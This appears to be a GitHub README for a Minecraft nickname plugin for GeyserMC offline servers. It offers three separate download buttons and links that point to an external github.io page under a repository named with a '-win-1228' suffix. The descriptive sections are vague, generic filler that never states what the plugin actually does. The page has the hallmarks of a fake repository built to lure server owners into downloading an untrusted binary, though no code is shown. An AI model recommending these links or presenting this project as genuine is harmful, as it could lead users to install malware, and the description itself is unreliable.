# Custom Names for GeyserMC v2026 - Game Script Utility 2026

> A Minecraft plugin for GeyserMC offline servers that streamlines nickname changes and fits into a Velocity-based setup with the right dependencies.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GeyserMC%20offline%20servers-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lukasstone71/customnamesforgeysermc-win-1228?style=flat-square)](https://github.com/lukasstone71/customnamesforgeysermc-win-1228)

---

<p align="center">
  <a href="https://lukasstone71.github.io/customnamesforgeysermc-win-1228/">
    <img src="https://img.shields.io/badge/Download-Custom%20Names%20for%20GeyserMC-brightgreen?style=for-the-badge" alt="Download Custom Names for GeyserMC">
  </a>
</p>

> **[Direct Download - Custom Names for GeyserMC](https://lukasstone71.github.io/customnamesforgeysermc-win-1228/)**

---

[Download Latest Build](https://lukasstone71.github.io/customnamesforgeysermc-win-1228/)

---

## Overview

Custom Names for GeyserMC is a Minecraft plugin focused on making nickname changes easier on GeyserMC offline servers. It is aimed at setups that rely on offline mode behavior and want a cleaner way to manage player-facing names without adding unnecessary complexity.

This project is built with Geyser and Velocity environments in mind, and it centers on configuration-driven name handling. It also includes metrics support through bStats, so server owners can keep track of usage in a standard plugin-friendly way while maintaining a simple setup path.

## Script Features

- Simplifies nickname changes for players on GeyserMC offline servers
- Targets Minecraft server setups using Geyser-related plugins and extensions
- Fits Velocity-based environments where offline mode support is needed
- Uses configuration for adjusting behavior without rebuilding the plugin
- Includes bStats metrics support for usage reporting
- Depends on essential plugin components required by the server setup
- Aims to improve the player experience around name handling
- Works as a small utility plugin rather than a full gameplay system

## Setup

1. Download the latest build from the link above.
2. Place the plugin file into your server's plugins directory.
3. Make sure the required dependencies are installed first, especially the Geyser and Velocity components used by your setup.
4. Start or restart the server so the plugin can load its configuration files.
5. Adjust the generated config if you want to change nickname behavior.

Example workflow:

- Download the build
- Copy it to `plugins/`
- Restart the server
- Edit the configuration if needed

## Options

Typical configuration areas may include nickname handling and metrics settings.

| Setting | Purpose |
| --- | --- |
| Nickname behavior | Controls how custom names are applied |
| Offline mode support | Matches the intended GeyserMC server environment |
| Metrics / bStats | Enables usage reporting support |
| Dependency checks | Helps the plugin start with required components present |
| Configuration file | Stores the main runtime settings |

## Compatibility

Custom Names for GeyserMC is intended for GeyserMC offline servers and related Minecraft plugin setups. It is especially relevant for environments that use Velocity and dependency-based plugin loading.

Known limitations:
- It is not designed as a standalone client tool
- It depends on the server-side plugin stack being present
- Behavior may vary depending on how your Geyser and Velocity components are configured

## FAQ

**How do I install it?**  
Download the build, place it in the server plugins folder, and restart the server.

**Where do I change the settings?**  
Use the generated configuration file after the first start.

**Does it need other plugins?**  
Yes, it requires the essential dependencies used by your GeyserMC and Velocity setup.

**Can I customize nickname handling?**  
Yes, configuration is the main way to adjust how names are managed.

**Does it include metrics support?**  
Yes, bStats metrics support is included.

**Will it work on every Minecraft server?**  
No, it is designed for GeyserMC offline server environments and related plugin stacks.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
